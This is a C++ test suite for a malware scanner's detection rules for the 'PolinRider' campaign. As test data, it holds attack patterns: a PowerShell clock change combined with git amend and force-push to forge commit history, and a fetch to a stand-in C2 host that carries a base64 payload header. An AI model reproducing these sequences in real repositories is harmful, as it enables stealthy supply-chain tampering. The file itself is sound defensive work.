#include "test_harness.h"

#include <algorithm>
#include <filesystem>

#include "core/core.h"
#include "crypto/sha256.h"
#include "git/git_propagation.h"
#include "preflight/esr.h"
#include "rules/rules.h"

using namespace abyss;
using namespace abyss::test;

namespace {
bool hasRule(const std::vector<Finding>& findings, const std::string& ruleId) {
    return std::any_of(findings.begin(), findings.end(), [&](const Finding& f) { return f.ruleId == ruleId; });
}
} // namespace

ABYSS_TEST("rule loader: loads the PolinRider campaign pack without errors") {
    auto result = rules::loadRulesFromFile(rulesDir() + "/campaigns/polinrider.rules");
    ABYSS_CHECK(result.errors.empty());
    ABYSS_CHECK(!result.rules.empty());
}

ABYSS_TEST("rule engine: matches the v1 and v2 obfuscator markers") {
    auto loaded = rules::loadRulesFromDirectory(rulesDir() + "/campaigns");
    rules::RuleEngine engine(loaded.rules);

    std::string v1 = readFixtureText("polinrider-v1-marker.js.sample");
    auto v1Findings = engine.evaluateFile("polinrider-v1-marker.js", "polinrider-v1-marker.js", ".js", v1);
    ABYSS_CHECK(hasRule(v1Findings, "polinrider.marker.obfuscator.v1"));
    ABYSS_CHECK(hasRule(v1Findings, "polinrider.global_marker.v1"));
    ABYSS_CHECK(hasRule(v1Findings, "polinrider.decoder.v1"));

    std::string v2 = readFixtureText("polinrider-v2-rotated.js.sample");
    auto v2Findings = engine.evaluateFile("polinrider-v2-rotated.js", "polinrider-v2-rotated.js", ".js", v2);
    ABYSS_CHECK(hasRule(v2Findings, "polinrider.marker.obfuscator.v2"));
    ABYSS_CHECK(!hasRule(v2Findings, "polinrider.marker.obfuscator.v1"));
}

ABYSS_TEST("rule engine: clean config matches no IOC rules") {
    auto loaded = rules::loadRulesFromDirectory(rulesDir() + "/campaigns");
    rules::RuleEngine engine(loaded.rules);
    std::string clean = readFixtureText("clean-config.js.sample");
    auto findings = engine.evaluateFile("clean-config.js", "clean-config.js", ".js", clean);
    ABYSS_CHECK(findings.empty());
}

ABYSS_TEST("rule engine: matches known propagation script filename by logical name, not sample path") {
    // The fixture is stored on disk as temp-auto-push.bat.sample (inert,
    // per project safety rules) — the test supplies the *logical* filename
    // the rule targets, independent of how the sample is stored.
    auto loaded = rules::loadRulesFromDirectory(rulesDir() + "/campaigns");
    rules::RuleEngine engine(loaded.rules);
    std::string content = readFixtureText("temp-auto-push.bat.sample");
    auto findings = engine.evaluateFile("temp_auto_push.bat", "temp_auto_push.bat", ".bat", content);
    ABYSS_CHECK(hasRule(findings, "polinrider.artifact.filename.propagation_scripts"));
}

ABYSS_TEST("git propagation: complete documented sequence produces GIT_HISTORY_TIME_MANIPULATION") {
    std::string content = readFixtureText("temp-auto-push.bat.sample");
    auto findings = git::scanGitPropagationArtifacts("scripts/build.bat", "build.bat", ".bat", content);
    ABYSS_CHECK(hasRule(findings, "git.propagation.history_time_manipulation"));
    auto it = std::find_if(findings.begin(), findings.end(),
                            [](const Finding& f) { return f.ruleId == "git.propagation.history_time_manipulation"; });
    ABYSS_CHECK(it != findings.end());
    if (it != findings.end()) {
        ABYSS_CHECK(it->severity == Severity::Critical);
        ABYSS_CHECK(it->confidence == Confidence::Confirmed);
        ABYSS_CHECK(std::find(it->tags.begin(), it->tags.end(), "GIT_HISTORY_TIME_MANIPULATION") != it->tags.end());
        // Save-then-restore clock manipulation plus full corroboration
        ABYSS_CHECK(std::find(it->tags.begin(), it->tags.end(), "clock-manipulation") != it->tags.end());
        ABYSS_CHECK(std::find(it->tags.begin(), it->tags.end(), "identity-spoofing") != it->tags.end());
        ABYSS_CHECK(std::find(it->tags.begin(), it->tags.end(), "metadata-recon") != it->tags.end());
    }
}

ABYSS_TEST("git propagation: partial corroboration (no identity/recon) stays below the complete-sequence label") {
    // Clock save+restore and amend+force-push, but none of the additional
    // corroborators (identity change / add / no-verify / metadata recon) —
    // an isolated legitimate time correction around an unrelated amend
    // must not be over-labeled as the complete attack sequence.
    std::string content = "powershell -Command \"Set-Date -Date '2024-01-01'\"\n"
                           "git commit --amend --no-edit\n"
                           "powershell -Command \"Set-Date -Date (Get-Date)\"\n"
                           "git push --force origin HEAD\n";
    auto findings = git::scanGitPropagationArtifacts("scripts/x.ps1", "x.ps1", ".ps1", content);
    ABYSS_CHECK(!hasRule(findings, "git.propagation.history_time_manipulation"));
    ABYSS_CHECK(hasRule(findings, "git.propagation.clock_amend_force_push_pattern"));
}

ABYSS_TEST("git propagation: clean build script produces no findings") {
    std::string content = readFixtureText("clean-build.bat.sample");
    auto findings = git::scanGitPropagationArtifacts("scripts/build.bat", "build.bat", ".bat", content);
    ABYSS_CHECK(findings.empty());
}

ABYSS_TEST("git propagation: non-script extensions are never evaluated") {
    std::string content = readFixtureText("temp-auto-push.bat.sample");
    auto findings = git::scanGitPropagationArtifacts("notes.txt", "notes.txt", ".txt", content);
    ABYSS_CHECK(findings.empty());
}

ABYSS_TEST("git propagation: amend without any push never fires (no false positive)") {
    std::string content = readFixtureText("clean-amend-no-push.sh.sample");
    auto findings = git::scanGitPropagationArtifacts("scripts/fix.sh", "fix.sh", ".sh", content);
    ABYSS_CHECK(findings.empty());
}

ABYSS_TEST("git propagation: force-push without amend never fires (legit release pattern)") {
    std::string content = readFixtureText("clean-release-force-push.sh.sample");
    auto findings = git::scanGitPropagationArtifacts("scripts/release.sh", "release.sh", ".sh", content);
    ABYSS_CHECK(findings.empty());
}

ABYSS_TEST("git propagation: combined short flag '-uf' is recognized as a force-push") {
    std::string content = readFixtureText("propagation-push-combined-flags.sh.sample");
    auto findings = git::scanGitPropagationArtifacts("scripts/deploy.sh", "deploy.sh", ".sh", content);
    ABYSS_CHECK(hasRule(findings, "git.propagation.clock_amend_force_push_pattern"));
}

ABYSS_TEST("git propagation: '--force-with-lease=<ref>' is recognized as a force-push") {
    std::string content = readFixtureText("propagation-push-force-with-lease.sh.sample");
    auto findings = git::scanGitPropagationArtifacts("scripts/deploy.sh", "deploy.sh", ".sh", content);
    ABYSS_CHECK(hasRule(findings, "git.propagation.clock_amend_force_push_pattern"));
}

ABYSS_TEST("git propagation: bare amend+force-push with zero corroboration is still flagged, but weakly") {
    std::string content = "git commit --amend --no-edit\ngit push -f origin HEAD\n";
    auto findings = git::scanGitPropagationArtifacts("scripts/x.sh", "x.sh", ".sh", content);
    ABYSS_CHECK(hasRule(findings, "git.propagation.clock_amend_force_push_pattern"));
    auto it = std::find_if(findings.begin(), findings.end(),
                            [](const Finding& f) { return f.ruleId == "git.propagation.clock_amend_force_push_pattern"; });
    if (it != findings.end()) {
        ABYSS_CHECK(it->confidence == Confidence::Low);
    }
}

ABYSS_TEST("git propagation: various force-push flag orderings are all recognized") {
    std::vector<std::string> variants = {
        "git commit --amend\ngit push -u -f origin HEAD\n",
        "git commit --amend\ngit push -f -u origin HEAD\n",
        "git commit --amend\ngit push -fu origin HEAD\n",
        "git commit --amend\ngit push --force origin HEAD\n",
    };
    for (const auto& v : variants) {
        auto findings = git::scanGitPropagationArtifacts("x.sh", "x.sh", ".sh", v);
        ABYSS_CHECK(hasRule(findings, "git.propagation.clock_amend_force_push_pattern"));
    }
}

ABYSS_TEST("git propagation: config.bat orchestrator regression fixture is detected") {
    std::string content = readFixtureText("config-bat-orchestrator.bat.sample");
    auto findings = git::scanGitPropagationArtifacts("scripts/config.bat", "config.bat", ".bat", content);
    ABYSS_CHECK(hasRule(findings, "git.propagation.history_time_manipulation"));
}

ABYSS_TEST("git propagation: piped 'echo <value>| date' and 'echo <value>| time' count as clock changes") {
    std::string content = readFixtureText("config-bat-orchestrator.bat.sample");
    auto findings = git::scanGitPropagationArtifacts("scripts/config.bat", "config.bat", ".bat", content);
    auto it = std::find_if(findings.begin(), findings.end(), [](const Finding& f) {
        return f.ruleId == "git.propagation.history_time_manipulation";
    });
    ABYSS_CHECK(it != findings.end());
    if (it != findings.end()) {
        ABYSS_CHECK(std::find(it->tags.begin(), it->tags.end(), "clock-manipulation") != it->tags.end());
    }
}

ABYSS_TEST("git propagation: direct-argument 'date <value>'/'time <value>' are recognized as clock changes") {
    std::string content = readFixtureText("date-time-direct-args.bat.sample");
    auto findings = git::scanGitPropagationArtifacts("scripts/x.bat", "x.bat", ".bat", content);
    ABYSS_CHECK(hasRule(findings, "git.propagation.history_time_manipulation"));
}

ABYSS_TEST("git propagation: 'date /t' / 'time /t' (read-only display) do not count as clock changes") {
    std::string content = "date /t\ntime /t\ngit commit --amend --no-edit\ngit push -f origin HEAD\n";
    auto findings = git::scanGitPropagationArtifacts("scripts/x.bat", "x.bat", ".bat", content);
    // Still fires on the amend+force-push anchor alone, but must never be
    // tagged clock-manipulation from these two read-only lines.
    for (const auto& f : findings) {
        ABYSS_CHECK(std::find(f.tags.begin(), f.tags.end(), "clock-manipulation") == f.tags.end());
    }
}

ABYSS_TEST("git propagation: a script that only documents the pattern in comments triggers nothing") {
    std::string content = readFixtureText("documentation-only-no-commands.bat.sample");
    auto findings = git::scanGitPropagationArtifacts("scripts/doc.bat", "doc.bat", ".bat", content);
    ABYSS_CHECK(findings.empty());
}

ABYSS_TEST("git propagation: echoed usage-example text (not real commands) triggers nothing") {
    std::string content = readFixtureText("echo-usage-example-no-commands.sh.sample");
    auto findings = git::scanGitPropagationArtifacts("scripts/help.sh", "help.sh", ".sh", content);
    ABYSS_CHECK(findings.empty());
}

ABYSS_TEST("git propagation: a quoted commit message containing attack-pattern words is not a command") {
    std::string content =
        "git commit -m \"describes git push -f and --amend for documentation purposes\"\n"
        "git push origin HEAD\n";
    auto findings = git::scanGitPropagationArtifacts("scripts/x.sh", "x.sh", ".sh", content);
    ABYSS_CHECK(findings.empty());
}

ABYSS_TEST("git propagation: caret line continuation is joined before tokenizing") {
    std::string content = "git commit --amend --no-edit ^\n    --no-verify\ngit push -f origin HEAD\n";
    auto findings = git::scanGitPropagationArtifacts("scripts/x.bat", "x.bat", ".bat", content);
    ABYSS_CHECK(hasRule(findings, "git.propagation.clock_amend_force_push_pattern"));
}

ABYSS_TEST("git propagation: '&' batch separator on one line is parsed as two commands") {
    std::string content = "git commit --amend --no-edit & git push -f origin HEAD\n";
    auto findings = git::scanGitPropagationArtifacts("scripts/x.bat", "x.bat", ".bat", content);
    ABYSS_CHECK(hasRule(findings, "git.propagation.clock_amend_force_push_pattern"));
}

ABYSS_TEST("git propagation: 'rem' comment line is excluded even when it contains real keywords") {
    std::string content = "rem git commit --amend --no-edit\nrem git push --force origin HEAD\necho done\n";
    auto findings = git::scanGitPropagationArtifacts("scripts/x.bat", "x.bat", ".bat", content);
    ABYSS_CHECK(findings.empty());
}

ABYSS_TEST("git propagation: '::' comment line is excluded even when it contains real keywords") {
    std::string content = ":: git commit --amend --no-edit\n:: git push --force origin HEAD\n";
    auto findings = git::scanGitPropagationArtifacts("scripts/x.bat", "x.bat", ".bat", content);
    ABYSS_CHECK(findings.empty());
}

ABYSS_TEST("git propagation: PowerShell '#' comment line is excluded") {
    std::string content = "# git commit --amend\n# git push --force origin HEAD\n";
    auto findings = git::scanGitPropagationArtifacts("scripts/x.ps1", "x.ps1", ".ps1", content);
    ABYSS_CHECK(findings.empty());
}

ABYSS_TEST(".gitignore: flags known propagation artifact filenames") {
    std::string content = readFixtureText("gitignore-hides-artifacts.sample");
    auto findings = git::scanGitignoreForHiddenArtifacts(".gitignore", ".gitignore", content);
    ABYSS_CHECK(hasRule(findings, "git.propagation.gitignore_hides_artifact"));
    int matchCount = 0;
    for (const auto& f : findings) {
        if (f.ruleId == "git.propagation.gitignore_hides_artifact") matchCount++;
    }
    ABYSS_CHECK_EQ(matchCount, 2); // temp_auto_push.bat and config.bat
}

ABYSS_TEST(".gitignore: clean file produces no findings") {
    std::string content = readFixtureText("clean-gitignore.sample");
    auto findings = git::scanGitignoreForHiddenArtifacts(".gitignore", ".gitignore", content);
    ABYSS_CHECK(findings.empty());
}

ABYSS_TEST(".gitignore: only applies to files literally named .gitignore") {
    std::string content = readFixtureText("gitignore-hides-artifacts.sample");
    auto findings = git::scanGitignoreForHiddenArtifacts("notes.txt", "notes.txt", content);
    ABYSS_CHECK(findings.empty());
}

ABYSS_TEST("rule engine: N_OF fires once the threshold count of groups match") {
    rules::Rule r;
    r.id = "test.n_of";
    r.name = "test";
    r.type = RuleType::Ioc;
    r.severity = Severity::High;
    r.confidence = Confidence::Medium;
    r.logic = rules::RuleLogic::NOf;
    r.nOfThreshold = 2;
    r.containsAny = {"alpha"};
    r.containsAll = {"beta"};
    r.filenameContains = {"suspicious"};
    rules::RuleEngine engine(std::vector<rules::Rule>{r});

    // Only one of three groups present -> below threshold.
    auto onlyOne = engine.evaluateFile("a.js", "a.js", ".js", "alpha only");
    ABYSS_CHECK(!hasRule(onlyOne, "test.n_of"));

    // Two of three groups match -> meets threshold.
    auto twoMatch = engine.evaluateFile("a.js", "a.js", ".js", "alpha and beta");
    ABYSS_CHECK(hasRule(twoMatch, "test.n_of"));

    // All three match -> still fires.
    auto three = engine.evaluateFile("suspicious.js", "suspicious.js", ".js", "alpha and beta");
    ABYSS_CHECK(hasRule(three, "test.n_of"));
}

ABYSS_TEST("rule engine: negation (contains_none) requires the forbidden substring to be absent") {
    rules::Rule r;
    r.id = "test.negation";
    r.name = "test";
    r.type = RuleType::Ioc;
    r.severity = Severity::Medium;
    r.confidence = Confidence::Medium;
    r.logic = rules::RuleLogic::All;
    r.containsAll = {"eval("};
    r.containsNone = {"// abyss-allow-eval"};
    rules::RuleEngine engine(std::vector<rules::Rule>{r});

    auto flagged = engine.evaluateFile("a.js", "a.js", ".js", "eval(x)");
    ABYSS_CHECK(hasRule(flagged, "test.negation"));

    auto suppressed = engine.evaluateFile("a.js", "a.js", ".js", "// abyss-allow-eval\neval(x)");
    ABYSS_CHECK(!hasRule(suppressed, "test.negation"));
}

ABYSS_TEST("rule engine: sha256 hash condition matches only the exact known-bad hash") {
    rules::Rule r;
    r.id = "test.hash";
    r.name = "test";
    r.type = RuleType::Ioc;
    r.severity = Severity::Critical;
    r.confidence = Confidence::Confirmed;
    r.sha256Hashes = {"b61b4cd5cd1d0cf3caf374e86b3db50a99fa7369a136854620ba372fb77baa43"};
    rules::RuleEngine engine(std::vector<rules::Rule>{r});

    auto noHash = engine.evaluateFile("f.woff2", "f.woff2", ".woff2", "content", "");
    ABYSS_CHECK(!hasRule(noHash, "test.hash"));

    auto wrongHash = engine.evaluateFile("f.woff2", "f.woff2", ".woff2", "content", std::string(64, 'a'));
    ABYSS_CHECK(!hasRule(wrongHash, "test.hash"));

    auto rightHash = engine.evaluateFile(
        "f.woff2", "f.woff2", ".woff2", "content", "b61b4cd5cd1d0cf3caf374e86b3db50a99fa7369a136854620ba372fb77baa43");
    ABYSS_CHECK(hasRule(rightHash, "test.hash"));
}

ABYSS_TEST("rule loader: rejects a rule whose n_of_threshold can never be satisfied") {
    std::string ruleText =
        "[rule]\nid=test.poisoned\nname=x\ntype=IOC\nseverity=LOW\nconfidence=LOW\nlogic=N_OF\n"
        "n_of_threshold=5\nmatch.contains=foo\n";
    // Loaded through the file-based loader to exercise the real validation path.
    std::filesystem::path tmpPath = std::filesystem::temp_directory_path() / "abyss_test_poisoned_rule.rules";
    std::ofstream f(tmpPath, std::ios::binary);
    f << ruleText;
    f.close();
    auto result = rules::loadRulesFromFile(tmpPath.string());
    ABYSS_CHECK(result.rules.empty());
    ABYSS_CHECK(!result.errors.empty());
    std::error_code ec;
    std::filesystem::remove(tmpPath, ec);
}

ABYSS_TEST("rule loader: rejects an invalid sha256 hash value") {
    std::string ruleText =
        "[rule]\nid=test.badhash\nname=x\ntype=IOC\nseverity=LOW\nconfidence=LOW\nmatch.sha256=not-a-hash\n";
    std::filesystem::path tmpPath = std::filesystem::temp_directory_path() / "abyss_test_badhash_rule.rules";
    std::ofstream f(tmpPath, std::ios::binary);
    f << ruleText;
    f.close();
    auto result = rules::loadRulesFromFile(tmpPath.string());
    ABYSS_CHECK(result.rules.empty());
    ABYSS_CHECK(!result.errors.empty());
    std::error_code ec;
    std::filesystem::remove(tmpPath, ec);
}

ABYSS_TEST("rule loader: rejects an invalid/negative version") {
    std::string ruleText = "[rule]\nid=test.badversion\nname=x\ntype=IOC\nseverity=LOW\nconfidence=LOW\nversion=-1\n"
                            "match.contains=foo\n";
    std::filesystem::path tmpPath = std::filesystem::temp_directory_path() / "abyss_test_badversion_rule.rules";
    std::ofstream f(tmpPath, std::ios::binary);
    f << ruleText;
    f.close();
    auto result = rules::loadRulesFromFile(tmpPath.string());
    ABYSS_CHECK(result.rules.empty());
    ABYSS_CHECK(!result.errors.empty());
    std::error_code ec;
    std::filesystem::remove(tmpPath, ec);
}

ABYSS_TEST("rule engine: require_all_groups needs every condition group to match") {
    auto loaded = rules::loadRulesFromDirectory(rulesDir() + "/campaigns");
    rules::RuleEngine engine(loaded.rules);

    auto headerOnly = engine.evaluateFile("a.js", "a.js", ".js", "response.headers['X-Payload-B64']");
    ABYSS_CHECK(!hasRule(headerOnly, "polinrider.c2.eth_deaddrop_header"));

    auto pathOnly = engine.evaluateFile("a.js", "a.js", ".js", "fetch('https://c2.example/0x/cls')");
    ABYSS_CHECK(!hasRule(pathOnly, "polinrider.c2.eth_deaddrop_header"));

    auto both = engine.evaluateFile(
        "a.js", "a.js", ".js", "fetch('https://c2.example/0x/cls', {headers:{'X-Payload-B64':'...'}})");
    ABYSS_CHECK(hasRule(both, "polinrider.c2.eth_deaddrop_header"));
}

namespace {
std::filesystem::path makeTempRulesDir(const std::string& name) {
    auto dir = std::filesystem::temp_directory_path() / name;
    std::error_code ec;
    std::filesystem::remove_all(dir, ec);
    std::filesystem::create_directories(dir, ec);
    return dir;
}
void writeFile(const std::filesystem::path& p, const std::string& content) {
    std::filesystem::create_directories(p.parent_path());
    std::ofstream f(p, std::ios::binary);
    f << content;
}
} // namespace

ABYSS_TEST("manifest verification: missing manifest is reported, not silently ok") {
    auto dir = makeTempRulesDir("abyss_test_manifest_missing");
    writeFile(dir / "core" / "x.rules", "[rule]\nid=x\nname=x\ntype=IOC\nseverity=LOW\nconfidence=LOW\nmatch.contains=z\n");
    auto v = rules::verifyRuleManifest(dir.string());
    ABYSS_CHECK(!v.manifestFound);
    ABYSS_CHECK(!v.allVerified);
    std::error_code ec;
    std::filesystem::remove_all(dir, ec);
}

ABYSS_TEST("manifest verification: a self-consistent (but non-official) manifest passes file-level checks, "
           "fails the compiled trust anchor") {
    // This binary has a real, non-empty compiled-in trust anchor (see
    // src/rules/trust_anchor.h) bound to the ACTUAL rules/MANIFEST.sha256
    // shipped with Abyss. A synthetic manifest built here in a temp
    // directory is internally self-consistent (its listed hash matches
    // its listed file) but is NOT the official manifest, so it correctly
    // fails anchor verification -- proving self-consistency alone isn't
    // treated as sufficient trust (see README.md).
    auto dir = makeTempRulesDir("abyss_test_manifest_ok");
    writeFile(dir / "core" / "x.rules", "[rule]\nid=x\nname=x\ntype=IOC\nseverity=LOW\nconfidence=LOW\nmatch.contains=z\n");
    std::string content = "[rule]\nid=x\nname=x\ntype=IOC\nseverity=LOW\nconfidence=LOW\nmatch.contains=z\n";
    std::string hash = crypto::sha256Hex(reinterpret_cast<const std::uint8_t*>(content.data()), content.size());
    writeFile(dir / "MANIFEST.sha256", hash + "  core/x.rules\n");
    auto v = rules::verifyRuleManifest(dir.string());
    ABYSS_CHECK(v.manifestFound);
    ABYSS_CHECK(v.manifestReadable);
    ABYSS_CHECK(v.untracked.empty());
    ABYSS_CHECK(v.anchorAvailable);     // this binary does have a compiled anchor
    ABYSS_CHECK(!v.anchorVerified);     // but this isn't the manifest it was built for
    ABYSS_CHECK(!v.mismatches.empty()); // the anchor mismatch itself is recorded as a mismatch entry
    ABYSS_CHECK(!v.allVerified);        // so overall verification correctly fails closed
    std::error_code ec;
    std::filesystem::remove_all(dir, ec);
}

ABYSS_TEST("manifest verification: the real official rules/ directory fully verifies, including the anchor") {
    auto v = rules::verifyRuleManifest(rulesDir());
    ABYSS_CHECK(v.manifestFound);
    ABYSS_CHECK(v.manifestReadable);
    ABYSS_CHECK(v.mismatches.empty());
    ABYSS_CHECK(v.untracked.empty());
    ABYSS_CHECK(v.anchorAvailable);
    ABYSS_CHECK(v.anchorVerified);
    ABYSS_CHECK(v.allVerified);
}

ABYSS_TEST("manifest verification: a tampered file after manifest generation is caught") {
    auto dir = makeTempRulesDir("abyss_test_manifest_tampered");
    std::string original = "[rule]\nid=x\nname=x\ntype=IOC\nseverity=LOW\nconfidence=LOW\nmatch.contains=z\n";
    std::string hash = crypto::sha256Hex(reinterpret_cast<const std::uint8_t*>(original.data()), original.size());
    writeFile(dir / "MANIFEST.sha256", hash + "  core/x.rules\n");
    writeFile(dir / "core" / "x.rules", original + "# tampered after manifest generation\n");
    auto v = rules::verifyRuleManifest(dir.string());
    ABYSS_CHECK(v.manifestFound);
    ABYSS_CHECK(!v.allVerified);
    ABYSS_CHECK(!v.mismatches.empty());
    std::error_code ec;
    std::filesystem::remove_all(dir, ec);
}

ABYSS_TEST("manifest verification: an untracked rule file not listed in the manifest is caught") {
    auto dir = makeTempRulesDir("abyss_test_manifest_untracked");
    writeFile(dir / "MANIFEST.sha256", "");
    writeFile(dir / "campaigns" / "sneaky.rules",
              "[rule]\nid=sneaky\nname=x\ntype=IOC\nseverity=CRITICAL\nconfidence=HIGH\nmatch.contains=z\n");
    auto v = rules::verifyRuleManifest(dir.string());
    ABYSS_CHECK(v.manifestFound);
    ABYSS_CHECK(!v.allVerified);
    ABYSS_CHECK(!v.untracked.empty());
    std::error_code ec;
    std::filesystem::remove_all(dir, ec);
}

ABYSS_TEST("manifest verification: an absolute path in the manifest is rejected") {
    auto dir = makeTempRulesDir("abyss_test_manifest_abs");
    std::string abs = (dir / "core" / "x.rules").string();
    std::replace(abs.begin(), abs.end(), '\\', '/');
    writeFile(dir / "MANIFEST.sha256", std::string(64, 'a') + "  " + abs + "\n");
    writeFile(dir / "core" / "x.rules", "irrelevant");
    auto v = rules::verifyRuleManifest(dir.string());
    ABYSS_CHECK(!v.allVerified);
    ABYSS_CHECK(!v.rejectedPaths.empty());
    std::error_code ec;
    std::filesystem::remove_all(dir, ec);
}

ABYSS_TEST("manifest verification: a '..' traversal path in the manifest is rejected") {
    auto dir = makeTempRulesDir("abyss_test_manifest_traversal");
    writeFile(dir / "MANIFEST.sha256", std::string(64, 'a') + "  ../../outside.rules\n");
    auto v = rules::verifyRuleManifest(dir.string());
    ABYSS_CHECK(!v.allVerified);
    ABYSS_CHECK(!v.rejectedPaths.empty());
    std::error_code ec;
    std::filesystem::remove_all(dir, ec);
}

ABYSS_TEST("manifest verification: a duplicate entry in the manifest is rejected") {
    auto dir = makeTempRulesDir("abyss_test_manifest_dup");
    std::string content = "[rule]\nid=x\nname=x\ntype=IOC\nseverity=LOW\nconfidence=LOW\nmatch.contains=z\n";
    std::string hash = crypto::sha256Hex(reinterpret_cast<const std::uint8_t*>(content.data()), content.size());
    writeFile(dir / "MANIFEST.sha256", hash + "  core/x.rules\n" + hash + "  core/x.rules\n");
    writeFile(dir / "core" / "x.rules", content);
    auto v = rules::verifyRuleManifest(dir.string());
    ABYSS_CHECK(!v.allVerified);
    ABYSS_CHECK(!v.rejectedPaths.empty());
    std::error_code ec;
    std::filesystem::remove_all(dir, ec);
}

ABYSS_TEST("manifest verification: a malformed manifest line is reported, not silently skipped") {
    auto dir = makeTempRulesDir("abyss_test_manifest_malformed");
    writeFile(dir / "MANIFEST.sha256", "not-a-valid-line-at-all\n");
    auto v = rules::verifyRuleManifest(dir.string());
    ABYSS_CHECK(v.manifestFound);
    ABYSS_CHECK(!v.allVerified);
    ABYSS_CHECK(!v.mismatches.empty());
    std::error_code ec;
    std::filesystem::remove_all(dir, ec);
}

ABYSS_TEST("duplicate rule IDs: detected across files and reported") {
    rules::Rule a;
    a.id = "dup.id";
    a.sourceFile = "fileA.rules";
    rules::Rule b;
    b.id = "dup.id";
    b.sourceFile = "fileB.rules";
    rules::Rule c;
    c.id = "unique.id";
    c.sourceFile = "fileC.rules";
    auto errs = rules::findDuplicateRuleIds({a, b, c});
    ABYSS_CHECK_EQ(errs.size(), (std::size_t)1);
}

ABYSS_TEST("duplicate rule IDs: no false positive when all IDs are unique") {
    rules::Rule a;
    a.id = "a";
    rules::Rule b;
    b.id = "b";
    auto errs = rules::findDuplicateRuleIds({a, b});
    ABYSS_CHECK(errs.empty());
}

ABYSS_TEST("ESR: loads web tooling registry and matches known config filenames") {
    auto result = preflight::loadExecutionSurfaces(rulesDir() + "/execution-surfaces");
    ABYSS_CHECK(result.errors.empty());
    preflight::ExecutionSurfaceRegistry registry(result.surfaces);
    ABYSS_CHECK(registry.match("next.config.js") != nullptr);
    ABYSS_CHECK(registry.match("tailwind.config.js") != nullptr);
    ABYSS_CHECK(registry.match("totally-unrelated-file.txt") == nullptr);
}
